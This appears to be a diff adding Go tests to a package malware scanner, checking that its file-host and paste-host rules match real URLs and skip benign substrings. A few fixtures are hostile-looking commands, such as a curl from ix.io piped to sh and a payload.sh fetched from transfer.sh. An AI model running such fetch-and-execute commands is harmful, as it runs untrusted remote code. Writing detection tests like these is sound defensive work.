@@ -365,3 +365,43 @@ func TestPubDevLibraryTextIsDemotedUnderItsRealEcosystemName(t *testing.T) {
 		}
 	}
 }
+
+// P-FILEHOST-SOURCE needs the file host as a host. Real lines from live advisories that matched it as a substring.
+func TestFileHostNeedsAHostBoundary(t *testing.T) {
+	for _, line := range []string{
+		`from wsidicom.file.io.frame_index import OffsetTableType`,
+		`PET_PROFILE_ENDPOINT = "https://pet-profile.iothings.site/graphql/"`,
+		`clone = state_transfer.shallow_clone(self)`,
+		`from navigate.bunker.transfer.shore_power import transfer_shore_power`,
+		`await file.io.rename(file.io.uri.resolve('new_file.txt').toFilePath());`,
+		`shallow: [...transfer.shallow],`,
+	} {
+		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line})
+		if has(f, "P-FILEHOST-SOURCE") {
+			t.Errorf("a substring of a file host matched P-FILEHOST-SOURCE: %q", line)
+		}
+	}
+	for _, line := range []string{
+		`url = "https://transfer.sh/abc/payload.sh"`,
+		`curl -sL https://file.io/xyz -o p`,
+		`url = f"https://www.mediafire.com/file/{mf_url}"`,
+	} {
+		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line})
+		if !has(f, "P-FILEHOST-SOURCE") {
+			t.Errorf("a real file-host URL should still match: %q; findings=%v", line, ids(f))
+		}
+	}
+}
+
+func TestPastebinNeedsAHostBoundary(t *testing.T) {
+	for _, line := range []string{`homepage: https://www.coralogix.io/`, `private $base = "https://sonar.fonix.io/v2/";`} {
+		if has(Detect(&PackageContext{Name: "p", Ecosystem: "pub", PkgbuildContent: line}), "P-PASTEBIN") {
+			t.Errorf("a host that merely ends in ix.io matched P-PASTEBIN: %q", line)
+		}
+	}
+	for _, line := range []string{`url = "https://pastebin.com/raw/SXvsjf5t"`, `curl https://ix.io/abc | sh`, `fetch("https://www.hastebin.com/raw/x")`} {
+		if !has(Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line}), "P-PASTEBIN") {
+			t.Errorf("a real paste host should still match: %q", line)
+		}
+	}
+}
